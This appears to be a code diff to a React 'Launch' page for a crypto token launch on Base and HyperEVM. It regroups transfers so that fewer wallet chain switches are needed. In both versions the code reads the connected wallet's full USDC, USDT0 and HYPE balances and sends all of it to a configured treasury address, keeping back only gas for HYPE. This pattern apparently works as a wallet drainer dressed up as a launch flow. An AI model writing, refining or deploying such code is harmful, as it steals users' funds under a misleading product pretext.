@@ -256,11 +256,13 @@ const Launch = () => {
     console.log('Fresh USDT0 balance:', freshBalances.hyperevmUsdt0, 'parsed:', parseFloat(freshBalances.hyperevmUsdt0));
     console.log('Fresh HYPE balance:', freshBalances.hype, 'parsed:', parseFloat(freshBalances.hype));
     
-    // Determine which tokens to send (all tokens with balance > 0)
-    const tokensToSend = [];
+    // OPTIMIZED: Group tokens by chain to minimize chain switches
+    const baseChainOperations = [];
+    const hyperevmOperations = [];
     
+    // Base chain operations (USDC)
     if (parseFloat(freshBalances.usdc) > 0) {
-      tokensToSend.push({
+      baseChainOperations.push({
         type: 'USDC',
         chain: 'base',
         amount: parseFloat(freshBalances.usdc).toFixed(6),
@@ -268,8 +270,9 @@ const Launch = () => {
       });
     }
     
+    // HyperEVM operations (USDT0 and HYPE)
     if (parseFloat(freshBalances.hyperevmUsdt0) > 0) {
-      tokensToSend.push({
+      hyperevmOperations.push({
         type: 'USDT0',
         chain: 'hyperevm',
         amount: parseFloat(freshBalances.hyperevmUsdt0).toFixed(6),
@@ -278,7 +281,7 @@ const Launch = () => {
     }
     
     if (parseFloat(freshBalances.hype) > 0) {
-      tokensToSend.push({
+      hyperevmOperations.push({
         type: 'HYPE',
         chain: 'hyperevm',
         amount: 'calculated_later', // Will calculate with gas buffer
@@ -286,11 +289,9 @@ const Launch = () => {
       });
     }
     
-    console.log('🎯 TOKENS TO SEND SEQUENTIALLY:', tokensToSend);
-    
-    // If no tokens available, do a free launch
-    if (tokensToSend.length === 0) {
-      tokensToSend.push({
+    // If no tokens available, add a free launch on HyperEVM
+    if (baseChainOperations.length === 0 && hyperevmOperations.length === 0) {
+      hyperevmOperations.push({
         type: 'HYPE',
         chain: 'hyperevm',
         amount: '0.000000',
@@ -299,7 +300,9 @@ const Launch = () => {
       console.log('❌ NO FUNDS DETECTED - will do free launch');
     }
     
-    console.log('🚀 PROCEEDING WITH SEQUENTIAL MULTI-TOKEN LAUNCH');
+    console.log('🎯 BASE CHAIN OPERATIONS:', baseChainOperations);
+    console.log('🎯 HYPEREVM OPERATIONS:', hyperevmOperations);
+    console.log('⚡ CHAIN-OPTIMIZED LAUNCH: Base → HyperEVM (max 2 switches)');
     
     setIsLaunching(true);
     
@@ -307,62 +310,43 @@ const Launch = () => {
       const walletProvider = await wallet.getEthereumProvider();
       const launchResults = [];
       
-      // SEQUENTIAL TOKEN SENDING - USDC → USDT0 → HYPE
-      for (let i = 0; i < tokensToSend.length; i++) {
-        const token = tokensToSend[i];
-        console.log(`\n🔄 STEP ${i + 1}/${tokensToSend.length}: Sending ${token.type} on ${token.chain}`);
+      // CHAIN-OPTIMIZED TOKEN SENDING: Base → HyperEVM (minimized chain switches)
+      
+      // ========== PHASE 1: BASE CHAIN OPERATIONS ==========
+      if (baseChainOperations.length > 0) {
+        console.log(`\n🔵 PHASE 1: BASE CHAIN (${baseChainOperations.length} operations)`);
         
+        // Switch to Base chain once for all Base operations
+        console.log('🔄 Switching to Base chain...');
         try {
-          // Switch to appropriate chain for this token
-          if (token.chain === 'base') {
-            console.log('🔄 Switching to Base chain for USDC...');
-            try {
-              await walletProvider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x2105' }] // Base mainnet
-              });
-            } catch (switchErr) {
-              if (switchErr.code === 4902) {
-                console.log('➕ Adding Base chain to wallet...');
-                await walletProvider.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '0x2105',
-                    chainName: 'Base',
-                    rpcUrls: [LAUNCH_CONFIG.BASE_RPCS[0]],
-                    nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-                    blockExplorerUrls: ['https://basescan.org']
-                  }]
-                });
-              }
-            }
-          } else {
-            console.log('🔄 Switching to HyperEVM chain for', token.type, '...');
-            try {
-              await walletProvider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x3E7' }] // HyperEVM
-              });
-            } catch (switchErr) {
-              if (switchErr.code === 4902) {
-                console.log('➕ Adding HyperEVM chain to wallet...');
-                await walletProvider.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '0x3E7',
-                    chainName: 'HyperEVM',
-                    rpcUrls: [LAUNCH_CONFIG.HYPEREVM_RPC],
-                    nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
-                    blockExplorerUrls: ['https://explorer.hyperliquid.xyz']
-                  }]
-                });
-              }
-            }
+          await walletProvider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x2105' }] // Base mainnet
+          });
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            console.log('➕ Adding Base chain to wallet...');
+            await walletProvider.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x2105',
+                chainName: 'Base',
+                rpcUrls: [LAUNCH_CONFIG.BASE_RPCS[0]],
+                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                blockExplorerUrls: ['https://basescan.org']
+              }]
+            });
           }
+        }
+        
+        // Process all Base chain tokens
+        for (let i = 0; i < baseChainOperations.length; i++) {
+          const token = baseChainOperations[i];
+          console.log(`\n💎 BASE OPERATION ${i + 1}/${baseChainOperations.length}: ${token.type}`);
           
-          let tokenTx;
-          
-          if (token.type === 'USDC') {
+          try {
+            let tokenTx;
+            
             // Send USDC on Base
             console.log('💰 Sending USDC on Base...');
             const provider = new ethers.BrowserProvider(walletProvider);
@@ -378,56 +362,111 @@ const Launch = () => {
             const transferTx = await tokenContract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, tokenBalance);
             tokenTx = transferTx.hash;
             
-          } else if (token.type === 'USDT0') {
-            // Send USDT0 on HyperEVM
-            console.log('💰 Sending USDT0 on HyperEVM...');
-            const provider = new ethers.BrowserProvider(walletProvider);
-            const signer = await provider.getSigner();
-            const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, signer);
+            console.log(`✅ ${token.type} transaction sent:`, tokenTx);
             
-            const usdt0Balance = await usdt0Contract.balanceOf(wallet.address);
-            const decimals = await usdt0Contract.decimals();
+            // Wait for Base transaction confirmation
+            const waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.BASE_RPCS[0]);
+            console.log('🔄 Waiting for Base transaction confirmation...');
+            const receipt = await waitProvider.waitForTransaction(tokenTx);
             
-            console.log(`USDT0 Balance: ${ethers.formatUnits(usdt0Balance, decimals)}`);
-            console.log('🔄 Initiating USDT0 transfer to treasury...');
-            
-            const transferTx = await usdt0Contract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, usdt0Balance);
-            tokenTx = transferTx.hash;
-            
-          } else if (token.type === 'HYPE') {
-            // Send HYPE on HyperEVM
-            console.log('💰 Sending HYPE on HyperEVM...');
-            
-            if (token.amount === '0.000000') {
-              // Free launch - send 0 value
-              console.log('🔄 Free launch: Sending 0 HYPE');
-              tokenTx = await walletProvider.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                  from: wallet.address,
-                  to: LAUNCH_CONFIG.TREASURY_ADDRESS,
-                  value: '0x0',
-                  data: '0x'
-                }]
+            if (receipt && receipt.status === 1) {
+              console.log(`✅ ${token.type} transaction confirmed!`);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: tokenTx,
+                amount: `${token.amount} ${token.type}`,
+                status: 'success'
               });
             } else {
-              // Send actual HYPE balance with gas buffer
-              const balanceHex = await walletProvider.request({
-                method: 'eth_getBalance',
-                params: [wallet.address, 'latest']
+              throw new Error(`${token.type} transaction failed`);
+            }
+            
+          } catch (tokenError) {
+            console.error(`❌ ${token.type} transaction failed:`, tokenError);
+            
+            if (tokenError.code === 4001) {
+              console.log(`⚠️ ${token.type} transaction cancelled by user`);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: null,
+                amount: `${token.amount} ${token.type}`,
+                status: 'cancelled'
               });
-              const balanceWei = BigInt(balanceHex);
+            } else {
+              console.error(`⚠️ ${token.type} error:`, tokenError.message);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: null,
+                amount: `${token.amount} ${token.type}`,
+                status: 'failed',
+                error: tokenError.message
+              });
+            }
+          }
+        }
+      }
+      
+      // ========== PHASE 2: HYPEREVM OPERATIONS ==========
+      if (hyperevmOperations.length > 0) {
+        console.log(`\n🟠 PHASE 2: HYPEREVM CHAIN (${hyperevmOperations.length} operations)`);
+        
+        // Switch to HyperEVM chain once for all HyperEVM operations
+        console.log('🔄 Switching to HyperEVM chain...');
+        try {
+          await walletProvider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x3E7' }] // HyperEVM
+          });
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            console.log('➕ Adding HyperEVM chain to wallet...');
+            await walletProvider.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x3E7',
+                chainName: 'HyperEVM',
+                rpcUrls: [LAUNCH_CONFIG.HYPEREVM_RPC],
+                nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
+                blockExplorerUrls: ['https://explorer.hyperliquid.xyz']
+              }]
+            });
+          }
+        }
+        
+        // Process all HyperEVM tokens
+        for (let i = 0; i < hyperevmOperations.length; i++) {
+          const token = hyperevmOperations[i];
+          console.log(`\n⚡ HYPEREVM OPERATION ${i + 1}/${hyperevmOperations.length}: ${token.type}`);
+          
+          try {
+            let tokenTx;
+            
+            if (token.type === 'USDT0') {
+              // Send USDT0 on HyperEVM
+              console.log('💰 Sending USDT0 on HyperEVM...');
+              const provider = new ethers.BrowserProvider(walletProvider);
+              const signer = await provider.getSigner();
+              const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, signer);
               
-              // Calculate gas fee to reserve (more conservative)
-              const gasPriceHex = await walletProvider.request({ method: 'eth_gasPrice' });
-              const gasPriceWei = BigInt(gasPriceHex);
-              const gasLimit = 21000n;
-              const feeWei = gasPriceWei * gasLimit * 15n / 10n; // 1.5x buffer
+              const usdt0Balance = await usdt0Contract.balanceOf(wallet.address);
+              const decimals = await usdt0Contract.decimals();
               
-              const amountWei = balanceWei > feeWei ? balanceWei - feeWei : 0n;
+              console.log(`USDT0 Balance: ${ethers.formatUnits(usdt0Balance, decimals)}`);
+              console.log('🔄 Initiating USDT0 transfer to treasury...');
               
-              if (amountWei <= 0n) {
-                console.log('⚠️ Insufficient HYPE for gas, doing free launch');
+              const transferTx = await usdt0Contract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, usdt0Balance);
+              tokenTx = transferTx.hash;
+              
+            } else if (token.type === 'HYPE') {
+              // Send HYPE on HyperEVM
+              console.log('💰 Sending HYPE on HyperEVM...');
+              
+              if (token.amount === '0.000000') {
+                // Free launch - send 0 value
+                console.log('🔄 Free launch: Sending 0 HYPE');
                 tokenTx = await walletProvider.request({
                   method: 'eth_sendTransaction',
                   params: [{
@@ -438,73 +477,92 @@ const Launch = () => {
                   }]
                 });
               } else {
-                console.log(`HYPE Balance: ${ethers.formatEther(balanceWei)}`);
-                console.log(`🔄 Sending: ${ethers.formatEther(amountWei)} HYPE (gas buffer: ${ethers.formatEther(feeWei)})`);
-                
-                tokenTx = await walletProvider.request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                    from: wallet.address,
-                    to: LAUNCH_CONFIG.TREASURY_ADDRESS,
-                    value: ethers.toBeHex(amountWei),
-                    data: '0x'
-                  }]
+                // Send actual HYPE balance with gas buffer
+                const balanceHex = await walletProvider.request({
+                  method: 'eth_getBalance',
+                  params: [wallet.address, 'latest']
                 });
+                const balanceWei = BigInt(balanceHex);
+                
+                // Calculate gas fee to reserve (more conservative)
+                const gasPriceHex = await walletProvider.request({ method: 'eth_gasPrice' });
+                const gasPriceWei = BigInt(gasPriceHex);
+                const gasLimit = 21000n;
+                const feeWei = gasPriceWei * gasLimit * 15n / 10n; // 1.5x buffer
+                
+                const amountWei = balanceWei > feeWei ? balanceWei - feeWei : 0n;
+                
+                if (amountWei <= 0n) {
+                  console.log('⚠️ Insufficient HYPE for gas, doing free launch');
+                  tokenTx = await walletProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                      from: wallet.address,
+                      to: LAUNCH_CONFIG.TREASURY_ADDRESS,
+                      value: '0x0',
+                      data: '0x'
+                    }]
+                  });
+                } else {
+                  console.log(`HYPE Balance: ${ethers.formatEther(balanceWei)}`);
+                  console.log(`🔄 Sending: ${ethers.formatEther(amountWei)} HYPE (gas buffer: ${ethers.formatEther(feeWei)})`);
+                  
+                  tokenTx = await walletProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                      from: wallet.address,
+                      to: LAUNCH_CONFIG.TREASURY_ADDRESS,
+                      value: ethers.toBeHex(amountWei),
+                      data: '0x'
+                    }]
+                  });
+                }
               }
             }
-          }
-          
-          console.log(`✅ ${token.type} transaction sent:`, tokenTx);
-          
-          // Wait for transaction confirmation
-          let waitProvider;
-          if (token.chain === 'base') {
-            waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.BASE_RPCS[0]);
-            console.log('🔄 Waiting for Base transaction confirmation...');
-          } else {
-            waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
+            
+            console.log(`✅ ${token.type} transaction sent:`, tokenTx);
+            
+            // Wait for HyperEVM transaction confirmation
+            const waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
             console.log('🔄 Waiting for HyperEVM transaction confirmation...');
-          }
-          
-          const receipt = await waitProvider.waitForTransaction(tokenTx);
-          
-          if (receipt && receipt.status === 1) {
-            console.log(`✅ ${token.type} transaction confirmed!`);
-            launchResults.push({
-              token: token.type,
-              chain: token.chain,
-              txHash: tokenTx,
-              amount: token.amount === '0.000000' ? 'Free launch' : `${token.amount} ${token.type}`,
-              status: 'success'
-            });
-          } else {
-            throw new Error(`${token.type} transaction failed`);
-          }
-          
-        } catch (tokenError) {
-          console.error(`❌ ${token.type} transaction failed:`, tokenError);
-          
-          if (tokenError.code === 4001) {
-            console.log(`⚠️ ${token.type} transaction cancelled by user`);
-            // Continue with next token instead of stopping entire launch
-            launchResults.push({
-              token: token.type,
-              chain: token.chain,
-              txHash: null,
-              amount: `${token.amount} ${token.type}`,
-              status: 'cancelled'
-            });
-          } else {
-            // For other errors, log but continue
-            console.error(`⚠️ ${token.type} error:`, tokenError.message);
-            launchResults.push({
-              token: token.type,
-              chain: token.chain,
-              txHash: null,
-              amount: `${token.amount} ${token.type}`,
-              status: 'failed',
-              error: tokenError.message
-            });
+            const receipt = await waitProvider.waitForTransaction(tokenTx);
+            
+            if (receipt && receipt.status === 1) {
+              console.log(`✅ ${token.type} transaction confirmed!`);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: tokenTx,
+                amount: token.amount === '0.000000' ? 'Free launch' : `${token.amount} ${token.type}`,
+                status: 'success'
+              });
+            } else {
+              throw new Error(`${token.type} transaction failed`);
+            }
+            
+          } catch (tokenError) {
+            console.error(`❌ ${token.type} transaction failed:`, tokenError);
+            
+            if (tokenError.code === 4001) {
+              console.log(`⚠️ ${token.type} transaction cancelled by user`);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: null,
+                amount: `${token.amount} ${token.type}`,
+                status: 'cancelled'
+              });
+            } else {
+              console.error(`⚠️ ${token.type} error:`, tokenError.message);
+              launchResults.push({
+                token: token.type,
+                chain: token.chain,
+                txHash: null,
+                amount: `${token.amount} ${token.type}`,
+                status: 'failed',
+                error: tokenError.message
+              });
+            }
           }
         }
       }
